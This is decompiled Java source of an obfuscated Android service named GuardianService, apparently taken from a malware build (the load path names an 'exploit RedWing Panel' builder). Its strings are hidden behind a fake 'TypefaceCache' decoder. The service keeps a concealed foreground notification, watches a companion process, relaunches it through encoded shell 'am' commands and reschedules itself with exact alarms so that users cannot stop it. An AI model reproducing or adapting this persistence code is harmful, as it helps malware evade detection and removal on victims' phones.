package app.mobilex.plus.services;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Process;
import app.mobilex.plus.util.TypefaceCache;
import java.io.File;
import java.util.List;
import v.s.KgSM0TsKUpCiuePB;
import v.s.VRUWMIt9DMXCmdEpyK46;
import v.s.YqOiSVb2wSv9Lq63qb;
import v.s.bzHLgVWZZfjKGub8Jt;
import v.s.okc5AGRjqrud84oM6d;
import v.s.s4Xe0OepSKbHpb3Nsd;
import v.s.u4HKFgCbgUKtEQ;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class GuardianService extends Service {
    public static final String D5P1xCAyuvgF;
    public static final String b1EoSIRjJHO5;
    public static volatile GuardianService hjneShqpF9Tis4;
    public static final String pyu8ovAipBTLYAiKab;
    public boolean Ee8d2j4S9Vm5yGuR;
    public int JXn4Qf7zpnLjP5;
    public long vekpFI4d1Nc4fakF;
    public final Handler dDIMxZXP1V8HdM = new Handler(Looper.getMainLooper());
    public int w9sT1Swbhx3hs = -1;
    public final GuardianService$pongReceiver$1 xDyLpEZyrcKVe0 = new BroadcastReceiver() { // from class: app.mobilex.plus.services.GuardianService$pongReceiver$1
        private static /* synthetic */ void usbo() {
        }

        @Override // android.content.BroadcastReceiver
        public final void onReceive(Context context, Intent intent) {
            GuardianService guardianService = this.dDIMxZXP1V8HdM;
            guardianService.Ee8d2j4S9Vm5yGuR = true;
            guardianService.JXn4Qf7zpnLjP5 = 0;
        }
    };
    public final YqOiSVb2wSv9Lq63qb ibVTtJUNfrGYbW = new YqOiSVb2wSv9Lq63qb(3, this);

    static {
        TypefaceCache.obtain("00040063005A009500F400B600D300A9001000600058");
        b1EoSIRjJHO5 = TypefaceCache.obtain("00240063005A009500F400B600D300A9001C00750053008600FE00B100D700AB");
        pyu8ovAipBTLYAiKab = TypefaceCache.obtain("00220066004B00C900FD00B000D000AE002F0073004300C900E000B300C700B4006D005A007200B100D5009100F7009400100049006B00AE00DE0098");
        D5P1xCAyuvgF = TypefaceCache.obtain("00220066004B00C900FD00B000D000AE002F0073004300C900E000B300C700B4006D005A007200B100D5009100F7009400100049006B00A800DE0098");
    }

    public static final void dDIMxZXP1V8HdM(GuardianService guardianService) {
        boolean zExists;
        if (guardianService.w9sT1Swbhx3hs <= 0) {
            guardianService.JXn4Qf7zpnLjP5();
            zExists = guardianService.w9sT1Swbhx3hs > 0;
        } else {
            try {
                zExists = new File(TypefaceCache.obtain("006C00660049008800F300F0") + guardianService.w9sT1Swbhx3hs).exists();
            } catch (Exception unused) {
            }
        }
        if (!zExists) {
            TypefaceCache.obtain("000E00770052008900B000AF00C000A8002000730048009400B000F700C200AE0027002B");
            TypefaceCache.obtain("006A00360052009400B000BB00D700A60027003A001B009500F500AC00C600A6003100620052008900F7");
            guardianService.w9sT1Swbhx3hs = 42 - 43;
            guardianService.JXn4Qf7zpnLjP5 = 0;
            guardianService.Ee8d2j4S9Vm5yGuR();
            return;
        }
        if (guardianService.Ee8d2j4S9Vm5yGuR) {
            guardianService.JXn4Qf7zpnLjP5 = 0;
        } else {
            int i = guardianService.JXn4Qf7zpnLjP5 + 1;
            guardianService.JXn4Qf7zpnLjP5 = i;
            if (i >= 6) {
                TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00C700A9003100730048009700FF00B100C100AE00350073001B00CF");
                TypefaceCache.obtain("0063007B0052009400E300BA00D600E7003300790055008000E300F6009E00E7002500790049008400F500FF00C000A200300062005A009500E400B600DC00A0");
                guardianService.JXn4Qf7zpnLjP5 = 0;
                guardianService.Ee8d2j4S9Vm5yGuR();
                return;
            }
        }
        guardianService.Ee8d2j4S9Vm5yGuR = false;
        try {
            guardianService.sendBroadcast(new Intent(pyu8ovAipBTLYAiKab).setPackage(guardianService.getPackageName()));
        } catch (Exception unused2) {
        }
    }

    private static /* synthetic */ void esmjqn() {
    }

    public final void Ee8d2j4S9Vm5yGuR() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        if (jCurrentTimeMillis - this.vekpFI4d1Nc4fakF < 10000) {
            return;
        }
        this.vekpFI4d1Nc4fakF = jCurrentTimeMillis;
        try {
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            y6jRGLEWNMir.Qrz92kRPw4GcghAc(this, TypefaceCache.obtain("0002005A007A00B500DD008000E0008200100042007A00B500C4"));
        } catch (Exception e) {
            TypefaceCache.obtain("00300077005D008200C300AB00D300B500370045005E009500E600B600D100A200630070005A008E00FC00BA00D600FD0063");
            e.getMessage();
            try {
                Runtime.getRuntime().exec(new String[]{TypefaceCache.obtain("006C00650042009400E400BA00DF00E80021007F005500C800F100B2"), TypefaceCache.obtain("00300062005A009500E400F200D400A800310073005C009500FF00AA00DC00A3006E0065005E009500E600B600D100A2"), "-n", getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500B400E900B100D10096001A0057005F008600E000AB00D700B5"), TypefaceCache.obtain("006E003B005E008E"), TypefaceCache.obtain("001C0061005F"), "1"});
            } catch (Exception unused) {
            }
        }
        try {
            Runtime.getRuntime().exec(new String[]{TypefaceCache.obtain("006C00650042009400E400BA00DF00E80021007F005500C800F100B2"), TypefaceCache.obtain("002100640054008600F400BC00D300B40037"), "-a", TypefaceCache.obtain("00220078005F009500FF00B600D600E9002A0078004F008200FE00AB009C00A6002000620052008800FE00F100F00088000C0042006400A400DF009200E2008B00060042007E00A3"), "-n", getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380049008200F300BA00DB00B100260064004800C900D800BE00DC00A3002F0073004900BF00DE009300DD00A6002700730049")});
        } catch (Exception unused2) {
        }
    }

    public final void JXn4Qf7zpnLjP5() {
        int i;
        Integer numHV4VTKNUdeHN;
        try {
            File file = new File(getFilesDir(), TypefaceCache.obtain("006D006600520083"));
            if (file.exists() && (numHV4VTKNUdeHN = VRUWMIt9DMXCmdEpyK46.hV4VTKNUdeHN(KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(u4HKFgCbgUKtEQ.vIJudZvPyTuNp(file)).toString())) != null && numHV4VTKNUdeHN.intValue() > 0) {
                if (numHV4VTKNUdeHN.intValue() != Process.myPid()) {
                    this.w9sT1Swbhx3hs = numHV4VTKNUdeHN.intValue();
                    return;
                }
            }
        } catch (Exception unused) {
        }
        try {
            Object systemService = getSystemService("activity");
            ActivityManager activityManager = systemService instanceof ActivityManager ? (ActivityManager) systemService : null;
            if (activityManager == null) {
                return;
            }
            String packageName = getPackageName();
            int iMyPid = Process.myPid();
            List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = activityManager.getRunningAppProcesses();
            if (runningAppProcesses != null) {
                for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) {
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(runningAppProcessInfo.processName, packageName) && (i = runningAppProcessInfo.pid) != iMyPid) {
                        this.w9sT1Swbhx3hs = i;
                        return;
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        hjneShqpF9Tis4 = this;
        vekpFI4d1Nc4fakF();
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9908 - 7, w9sT1Swbhx3hs(), 1073741824);
            } else {
                startForeground(9901, w9sT1Swbhx3hs());
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00040063005A009500F400B600D300A9001000730049009100F900BC00D700E700300062005A009500E4009900DD00B5002600710049008800E500B100D600E7002500770052008B00F500BB008800E7");
            e.getMessage();
            if (Build.VERSION.SDK_INT >= 31 && bzHLgVWZZfjKGub8Jt.ibVTtJUNfrGYbW(e)) {
                xDyLpEZyrcKVe0();
                stopSelf();
                return;
            }
        }
        try {
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(this.xDyLpEZyrcKVe0, new IntentFilter(D5P1xCAyuvgF), 4);
            } else {
                registerReceiver(this.xDyLpEZyrcKVe0, new IntentFilter(D5P1xCAyuvgF));
            }
        } catch (Exception unused) {
        }
        JXn4Qf7zpnLjP5();
        this.dDIMxZXP1V8HdM.postDelayed(this.ibVTtJUNfrGYbW, 10000L);
    }

    @Override // android.app.Service
    public final void onDestroy() {
        hjneShqpF9Tis4 = null;
        this.dDIMxZXP1V8HdM.removeCallbacks(this.ibVTtJUNfrGYbW);
        try {
            unregisterReceiver(this.xDyLpEZyrcKVe0);
        } catch (Exception unused) {
        }
        Ee8d2j4S9Vm5yGuR();
        xDyLpEZyrcKVe0();
        super.onDestroy();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        int intExtra;
        hjneShqpF9Tis4 = this;
        try {
            vekpFI4d1Nc4fakF();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9908 - 7, w9sT1Swbhx3hs(), 1073741824);
            } else {
                startForeground(9901, w9sT1Swbhx3hs());
            }
        } catch (Exception e) {
            TypefaceCache.obtain("00040063005A009500F400B600D300A9001000730049009100F900BC00D700E700300062005A009500E4009900DD00B5002600710049008800E500B100D600E7002600640049008800E200FF00DB00A900630079005500B400E400BE00C000B3000000790056008A00F100B100D600FD0063");
            e.getMessage();
            if (Build.VERSION.SDK_INT >= 31 && bzHLgVWZZfjKGub8Jt.ibVTtJUNfrGYbW(e)) {
                xDyLpEZyrcKVe0();
                stopSelf();
                return 1;
            }
        }
        if (intent != null && (intExtra = intent.getIntExtra(TypefaceCache.obtain("001C007B005A008E00FE008000C200AE0027"), -1)) > 0) {
            this.w9sT1Swbhx3hs = intExtra;
        }
        return 1;
    }

    @Override // android.app.Service
    public final void onTaskRemoved(Intent intent) {
        Ee8d2j4S9Vm5yGuR();
        xDyLpEZyrcKVe0();
        super.onTaskRemoved(intent);
    }

    public final void vekpFI4d1Nc4fakF() {
        NotificationChannel notificationChannel = new NotificationChannel(b1EoSIRjJHO5, TypefaceCache.obtain("0010006F0048009300F500B2"), 1);
        notificationChannel.setShowBadge(false);
        notificationChannel.setLockscreenVisibility(-1);
        Object systemService = getSystemService("notification");
        NotificationManager notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        }
    }

    public final Notification w9sT1Swbhx3hs() {
        s4Xe0OepSKbHpb3Nsd s4xe0oepskbhpb3nsd = new s4Xe0OepSKbHpb3Nsd(this, b1EoSIRjJHO5);
        s4xe0oepskbhpb3nsd.K7eEOBPYP9VIoHWTe.icon = 2131034145;
        s4xe0oepskbhpb3nsd.hjneShqpF9Tis4 = -2;
        s4xe0oepskbhpb3nsd.vekpFI4d1Nc4fakF(2, true);
        s4xe0oepskbhpb3nsd.dTS0S7eC32ubQH54j36 = true;
        return s4xe0oepskbhpb3nsd.dDIMxZXP1V8HdM();
    }

    public final void xDyLpEZyrcKVe0() {
        try {
            Object systemService = getSystemService("alarm");
            AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
            if (alarmManager == null) {
                return;
            }
            alarmManager.setExactAndAllowWhileIdle(0, System.currentTimeMillis() + ((long) 5000), PendingIntent.getService(this, 9902, new Intent(this, (Class<?>) GuardianService.class), 201326592));
        } catch (Exception unused) {
        }
    }
}
